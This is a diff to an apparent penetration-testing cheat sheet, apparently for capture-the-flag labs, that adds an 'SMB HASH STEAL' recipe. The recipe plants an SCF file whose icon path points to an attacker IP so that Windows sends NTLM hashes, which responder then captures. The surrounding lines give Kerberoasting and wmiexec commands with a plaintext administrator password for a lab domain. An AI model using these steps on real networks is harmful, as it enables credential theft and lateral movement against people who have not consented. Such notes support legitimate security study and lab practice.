@@ -171,6 +171,16 @@ msfconsole use winrm
 impacket-lookupids
 procdump https://download.sysinternals.com/files/Procdump.zip
 
+SMB HASH STEAL
+1)Create file named hash.scf:
+[Shell]
+Command=2
+IconFile=\\10.10.14.108\share\pentestlab.ico
+[Taskbar]
+Command=ToggleDesktop
+2)Start responder
+sudo responder -I tun0
+3)Upload file and get hash when a user logs on
 KERBEROASTING
 python /usr/share/doc/python3-impacket/examples/GetUserSPNs.py active.htb/SVC_TGS -dc-ip 10.129.145.201 -request
 python /usr/share/doc/python3-impacket/examples/wmiexec.py active.htb/administrator:Ticketmaster1968@10.129.145.201
